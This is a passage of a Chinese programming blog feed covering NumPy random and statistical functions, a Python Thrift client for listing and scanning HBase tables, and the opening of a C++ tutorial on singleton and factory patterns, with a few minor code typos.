class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.shuffle(i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> i</span><br><span class="line">[[<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]</span><br><span class="line"> [ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.choice(i.flatten(), size=(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">1</span>, <span class="number">15</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">16</span>, <span class="number">20</span>,  <span class="number">0</span>, <span class="number">21</span>],</span><br><span class="line">       [<span class="number">13</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">10</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.choice(i.flatten(), size=(<span class="number">3</span>,<span class="number">4</span>), replace=<span class="literal">False</span>)</span><br><span class="line">array([[ <span class="number">6</span>,  <span class="number">2</span>, <span class="number">12</span>, <span class="number">19</span>],</span><br><span class="line">       [ <span class="number">7</span>,  <span class="number">9</span>, <span class="number">13</span>, <span class="number">22</span>],</span><br><span class="line">       [<span class="number">17</span>, <span class="number">21</span>, <span class="number">20</span>,  <span class="number">0</span>]])</span><br></pre></td></tr></table></figure>

<h2 id="随机分布"><a href="#随机分布" class="headerlink" title="随机分布"></a>随机分布</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">uniform(low,high,size)</td>
<td align="left">产生均匀分布的数组，low起始值，hight结束值，size形状</td>
</tr>
<tr>
<td align="left">normal(loc,scale,size)</td>
<td align="left">产生正态分布的数组，loc均值，scale标准差，size形状</td>
</tr>
<tr>
<td align="left">poisson(lam,size)</td>
<td align="left">产生泊松分布的数组，lam随机事件发生率，size形状</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.uniform(<span class="number">0</span>,<span class="number">10</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[ <span class="number">7.60854954</span>,  <span class="number">6.30411065</span>,  <span class="number">0.79332327</span>,  <span class="number">1.30857967</span>],</span><br><span class="line">       [ <span class="number">3.00316754</span>,  <span class="number">3.22281521</span>,  <span class="number">1.61121489</span>,  <span class="number">3.15193241</span>],</span><br><span class="line">       [ <span class="number">5.25528483</span>,  <span class="number">6.45849382</span>,  <span class="number">7.50645475</span>,  <span class="number">0.56027292</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.normal(<span class="number">10</span>,<span class="number">5</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[  <span class="number">8.29746473</span>,  <span class="number">14.35578466</span>,   <span class="number">9.40820399</span>,   <span class="number">9.47806228</span>],</span><br><span class="line">       [ <span class="number">20.81393417</span>,   <span class="number">6.16603104</span>,   <span class="number">2.10005772</span>,  <span class="number">11.39870886</span>],</span><br><span class="line">       [ <span class="number">11.81287925</span>,   <span class="number">5.19702161</span>,  <span class="number">11.13850168</span>,  <span class="number">13.95413254</span>]])</span><br></pre></td></tr></table></figure>


<h1 id="NumPy的统计函数"><a href="#NumPy的统计函数" class="headerlink" title="NumPy的统计函数"></a>NumPy的统计函数</h1><p>NumPy直接提供库一级别的统计函数<code>import numpy.*</code> or <code>np.std()</code>、<code>np.var()</code>…</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sum(a, axis&#x3D;None)</td>
<td align="left">对数组a求和，默认所有元素，axis指定维度</td>
</tr>
<tr>
<td align="left">mean((a, axis&#x3D;None)a</td>
<td align="left">对数组a求平均值，默认所有元素，axis指定维度</td>
</tr>
<tr>
<td align="left">average(a, axis&#x3D;None, weights&#x3D;None)</td>
<td align="left">对数组a求加权平均值，默认所有元素，axis指定维度</td>
</tr>
<tr>
<td align="left">std(a, axis&#x3D;None)</td>
<td align="left">对数组a求标准差，默认所有元素，axis指定维度</td>
</tr>
<tr>
<td align="left">var(a, axis&#x3D;None)</td>
<td align="left">对数组a求方差，默认所有元素，axis指定维度</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> h</span><br><span class="line">[[[<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span>]</span><br><span class="line">  [<span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]</span><br><span class="line">  [ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line"> [[ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line">  [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br><span class="line">  [<span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(h)</span><br><span class="line"><span class="number">276</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(h,axis=<span class="number">0</span>)</span><br><span class="line">array([[<span class="number">20</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>],</span><br><span class="line">       [<span class="number">28</span>, <span class="number">30</span>, <span class="number">32</span>, <span class="number">34</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(h,axis=<span class="number">1</span>)</span><br><span class="line">array([[<span class="number">36</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">45</span>],</span><br><span class="line">       [<span class="number">24</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">33</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(h,axis=<span class="number">2</span>)</span><br><span class="line">array([[<span class="number">70</span>, <span class="number">86</span>,  <span class="number">6</span>],</span><br><span class="line">       [<span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.average(h,axis=<span class="number">1</span>,weights=[<span class="number">10</span>,<span class="number">5</span>,<span class="number">1</span>])</span><br><span class="line">array([[ <span class="number">16.25</span>,  <span class="number">17.25</span>,  <span class="number">18.25</span>,  <span class="number">19.25</span>],</span><br><span class="line">       [  <span class="number">5.75</span>,   <span class="number">6.75</span>,   <span class="number">7.75</span>,   <span class="number">8.75</span>]])</span><br><span class="line"><span class="comment"># (16*10 + 20*5 + 0*1)/(10+5+1)=16.25</span></span><br><span class="line"><span class="comment"># (17*10 + 21*5 + 1*1)/(10+5+1)=17.25</span></span><br><span class="line"><span class="comment"># (18*10 + 22*5 + 2*1)/(10+5+1)=18.25</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">min(a) max(a)</td>
<td align="left">数组a中的最小值、最大值</td>
</tr>
<tr>
<td align="left">argmin(a) argmax(a)</td>
<td align="left">数组a中最小值、最大值降到一维后的下标索引</td>
</tr>
<tr>
<td align="left">unravel_index(index,shape)</td>
<td align="left">根据shape将一维下标索引index转换成多维下标索引</td>
</tr>
<tr>
<td align="left">ptp(a)</td>
<td align="left">数组a中最大值与最小值的差</td>
</tr>
<tr>
<td align="left">median(a)</td>
<td align="left">数组a中元素的中位数（中值）</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> h</span><br><span class="line">[[[<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span>]</span><br><span class="line">  [<span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]</span><br><span class="line">  [ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line"> [[ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line">  [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br><span class="line">  [<span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">max</span>(h)</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.argmax(h)</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.unravel_index(np.argmax(h), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.ptp(h)</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.median(h)</span><br><span class="line"><span class="number">11.5</span></span><br></pre></td></tr></table></figure>

<h1 id="NumPy的梯度函数"><a href="#NumPy的梯度函数" class="headerlink" title="NumPy的梯度函数"></a>NumPy的梯度函数</h1><h2 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h2><p>连续值之间的变化率，即斜率。若有a,b,c三个值，b存在两侧值，b的梯度&#x3D;(c-a)&#x2F;2；若有a，b两个值，b只有一侧值，b或a的梯度＝(b-a)&#x2F;1</p>
<h2 id="梯度计算"><a href="#梯度计算" class="headerlink" title="梯度计算"></a>梯度计算</h2><p><code>np.gradient(a)</code>计算数组a中的梯度，若a为多维数组，返回每个维度梯度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.gradient(h)</span><br><span class="line">[array([[[-<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>],</span><br><span class="line">         [-<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>],</span><br><span class="line">         [ <span class="number">12.</span>,  <span class="number">12.</span>,  <span class="number">12.</span>,  <span class="number">12.</span>]],</span><br><span class="line"></span><br><span class="line">        [[-<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>],</span><br><span class="line">         [-<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>, -<span class="number">12.</span>],</span><br><span class="line">         [ <span class="number">12.</span>,  <span class="number">12.</span>,  <span class="number">12.</span>,  <span class="number">12.</span>]]]), </span><br><span class="line"> array([[[  <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>],</span><br><span class="line">         [ -<span class="number">8.</span>,  -<span class="number">8.</span>,  -<span class="number">8.</span>,  -<span class="number">8.</span>],</span><br><span class="line">         [-<span class="number">20.</span>, -<span class="number">20.</span>, -<span class="number">20.</span>, -<span class="number">20.</span>]],</span><br><span class="line"></span><br><span class="line">        [[  <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>],</span><br><span class="line">         [  <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>],</span><br><span class="line">         [  <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>,   <span class="number">4.</span>]]]),</span><br><span class="line"> array([[[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">         [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">         [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">         [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">         [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]]])]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> h</span><br><span class="line">[[[<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span>]</span><br><span class="line">  [<span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]</span><br><span class="line">  [ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line"> [[ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line">  [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br><span class="line">  [<span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]]]</span><br></pre></td></tr></table></figure>

<p>*** 梯度计算用于发现声音或图像数据的边缘，当梯度发生很大变化时，此处即为边缘 ***</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.icourse163.org/learn/BIT-1001870002?tid=1002239009">Python数据分析与展示</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>python访问hbase方法</title>
    <url>/2017/09/25/language/python/python-thrift-hbase/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>python不能直接访问hbase，必须通过thrift插件才能访问hbase，下面是对<code>hbase</code>和<code>thrift</code>python插件的安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install thrift</span><br><span class="line">pip install hbase-thrift</span><br></pre></td></tr></table></figure>


<h1 id="访问hbase"><a href="#访问hbase" class="headerlink" title="访问hbase"></a>访问hbase</h1><p>hbase_client.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> thrift.transport <span class="keyword">import</span> TSocket</span><br><span class="line"><span class="keyword">from</span> thrift.transport <span class="keyword">import</span> TTransport</span><br><span class="line"><span class="keyword">from</span> thrift.protocol <span class="keyword">import</span> TBinaryProtocol</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hbase <span class="keyword">import</span> Hbase</span><br><span class="line"><span class="keyword">from</span> hbase.ttypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HbaseClient</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host=<span class="string">&#x27;&#x27;</span>, port=<span class="number">9090</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.sock = TSocket.TSocket(host, port)</span><br><span class="line">        <span class="variable language_">self</span>.transport = TTransport.TBufferedTransport(<span class="variable language_">self</span>.sock)</span><br><span class="line">        <span class="variable language_">self</span>.proto = TBinaryProtocol.TBinaryProtocol(<span class="variable language_">self</span>.transport)</span><br><span class="line">        <span class="variable language_">self</span>.client = Hbase.Client(<span class="variable language_">self</span>.proto)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.transport.<span class="built_in">open</span>()</span><br><span class="line">        tables = <span class="variable language_">self</span>.client.getTableNames()</span><br><span class="line">        <span class="variable language_">self</span>.transport.close()</span><br><span class="line">        <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_column_desp</span>(<span class="params">self, table_name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.transport.<span class="built_in">open</span>()</span><br><span class="line">        column_desp = <span class="variable language_">self</span>.client.getColumnDescriptors(table_name)</span><br><span class="line">        <span class="variable language_">self</span>.transport.close()</span><br><span class="line">        <span class="keyword">return</span> column_desp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_hbase_client</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.client</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.transport.<span class="built_in">open</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.transport.close()</span><br></pre></td></tr></table></figure>

<p>test.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hbase_client <span class="keyword">as</span> hc</span><br><span class="line"></span><br><span class="line">con = hc.HbaseClient(host=<span class="string">&#x27;x.x.x.x&#x27;</span>)</span><br><span class="line">client = con.get_hbase_client()</span><br><span class="line"></span><br><span class="line">con.<span class="built_in">open</span>()</span><br><span class="line">tbls = client.getTableNames()</span><br><span class="line"><span class="built_in">print</span> tbls</span><br><span class="line">mytbls = []</span><br><span class="line"><span class="keyword">for</span> tbl <span class="keyword">in</span> tbls:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (tbl == <span class="string">&#x27;YJDD:myApp&#x27;</span> <span class="keyword">or</span> tbl == <span class="string">&#x27;YJDD:myAppDetail&#x27;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ColumnDescriptors:&quot;</span></span><br><span class="line">    tbl_desp = client.getColumnDescriptors(tbl)</span><br><span class="line">    <span class="built_in">print</span> tbl_desp</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;TableRegions:&quot;</span></span><br><span class="line">    tbl_reg = client.getTableRegions(tbl)</span><br><span class="line">    <span class="built_in">print</span> tbl_reg</span><br><span class="line">    mytbls.append(tbl)</span><br><span class="line">                                            </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;============== scannerGet ============&quot;</span></span><br><span class="line"><span class="keyword">for</span> tbl <span class="keyword">in</span> mytbls:</span><br><span class="line">    sid = client.scannerOpen(tbl, <span class="string">&#x27;&#x27;</span>, [<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;app&#x27;</span>])</span><br><span class="line">    row_result = client.scannerGet(sid)</span><br><span class="line">    <span class="built_in">print</span> row_result</span><br><span class="line">    <span class="keyword">while</span> row_result:</span><br><span class="line">        row_result = client.scannerGet(sid)</span><br><span class="line">        <span class="keyword">if</span> row_result:</span><br><span class="line">            <span class="built_in">print</span> row_result</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;--------------------------&quot;</span></span><br><span class="line"></span><br><span class="line">    client.scannerClose(sid)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;=============== scannerGetList ============&quot;</span></span><br><span class="line"><span class="keyword">for</span> tbl <span class="keyword">in</span> mytbls:</span><br><span class="line">    sid = client.scannerOpen(tbl, <span class="string">&#x27;&#x27;</span>, [<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;app&#x27;</span>])</span><br><span class="line">    row_result = client.scannerGetList(sid, <span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span> row_result</span><br><span class="line">    client.scannerClose(sid)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;--------------------------&quot;</span></span><br><span class="line">con.close()</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.jianshu.com/p/e916815470f1">python 通过thrift访问hbase</a></li>
<li><a href="https://wiki.apache.org/hadoop/Hbase/ThriftApi">ThriftAPI</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>hbase</tag>
        <tag>thrift</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式——创建型模式</title>
    <url>/2021/09/10/design/pattern/design-pattern-creating/</url>
    <content><![CDATA[<p>设计模式是前人在工作总结出来的一些设计经验。后人使用这些经验进行设计开发，可以减少设计缺陷。常用的设计模式有23个，这23个设计模式分为三类，分别是“创建型模式”、“<a href="">行为型模式</a>”、“<a href="">结构型模式</a>”。</p>
<h1 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h1><p>顾名思义，用来创建生成对象的设计模式。创建型模式包括：“单例模式”、“工厂模式”和“构建者模式”，其中工厂模式又分为“简单工厂模式”、“工厂方法模式”和“抽象工厂模式”。</p>
<p>故事是这样开始的……</p>
<p>在很久很久以前，有个<code>Product</code>他是这样定义的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ProductA</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>那时候还没有设计模式，人们创建对象一般都是用<code>new</code>在堆上分配或者直接在栈上定义。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ProductA *p = <span class="keyword">new</span> <span class="built_in">ProductA</span>();</span><br><span class="line">    p-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后来，使用这个<code>Product</code>对象的人越来越多，每个人都想new一下，而且<code>Product</code>又不想被频繁的new，于是前人想了个办法将<code>Product</code>的对象定义为一个<code>static</code>的变量，然后每次在<code>new</code>之前判断一下，看是否需要<code>new</code>。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingleInstance</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">static</span> ProductA *m_p;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">static</span> ProductA* <span class="title">CreateProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(m_p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                m_p = <span class="keyword">new</span> <span class="built_in">ProductA</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> m_p;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这就是“单例模式”。</p>
<hr>
<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><ul>
<li>某个类只能有一个实例</li>
<li>它必须自行创建这个实例</li>
<li>它必须自行向整个系统提供这个实例</li>
</ul>
<p><img src="/images/patterns/single_1.jpg" alt="single_1"></p>
<ul>
<li>单例类的构造函数为私有</li>
<li>提供一个自身的静态私有成员变量</li>
<li>提供一个公有的静态工厂方法</li>
</ul>
<p><img src="/images/patterns/single_2.jpg" alt="single_2"></p>
<hr>
<p>后来，前人又开发了<code>ProductB</code>，<code>ProductA</code>和<code>ProductB</code>同属于<code>Product</code>，于是我们的product变成了这样</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductA</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductB</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>为了方便创建对象，前人决定用<code>&quot;PA&quot;</code>代表<code>ProductA</code>、<code>&quot;PB&quot;</code>代表<code>ProductB</code>，再创建一个工厂，用来创建对象，在创建对象时候指定<code>PA</code> 或者<code>PB</code>，工厂根据指定的内容来决定是创建<code>ProductA</code>还是<code>ProductB</code>。</p>
<p>Example：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PD_TYPE</span> &#123;</span><br><span class="line">    PA,</span><br><span class="line">    PB</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProduct</span><span class="params">(PD_TYPE pt)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">SimpleFactory::CreateProduct</span><span class="params">(PD_TYPE pt)</span></span>&#123;</span><br><span class="line">    Product *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">switch</span>(pt) &#123;</span><br><span class="line">        <span class="keyword">case</span> PA:</span><br><span class="line">        &#123;</span><br><span class="line">            p = <span class="keyword">new</span> <span class="built_in">ProductA</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> PB:</span><br><span class="line">        &#123;</span><br><span class="line">            p = <span class="keyword">new</span> <span class="built_in">ProductB</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
<p>这就是“简单工厂模式”。</p>
<hr>
<h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><ul>
<li>根据参数的不同返回不同类的实例</li>
<li>简单工厂模式专门定义一个类来负责创建其他类的实例</li>
<li>被创建的实例通常都具有共同的父类</li>
</ul>
<p><img src="/images/patterns/simple_factory_1.jpg" alt="simple_factory_1"></p>
<p><img src="/images/patterns/simple_factory_2.jpg" alt="simple_factory_2"></p>
<hr>
<p>随着<code>Product</code>种类的不断增加，我们需要不断的修改<code>SimpleFactory::CreateProduct</code>方法，这样会增加<code>SimpleFactory::CreateProduct</code>出错的风险，所以前人按照不同的产品创建了不同的工厂，这样以后在增加新的产品只需要增加对应的工厂就可以了。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MethodFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> Product* <span class="title">CreateProduct</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MethodFactoryPA</span> : <span class="keyword">public</span> MethodFactory &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProduct</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MethodFactoryPB</span> : <span class="keyword">public</span> MethodFactory &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProduct</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">MethodFactoryPA::CreateProduct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductA</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">MethodFactoryPB::CreateProduct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductB</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是“工厂方法模式”</p>
<hr>
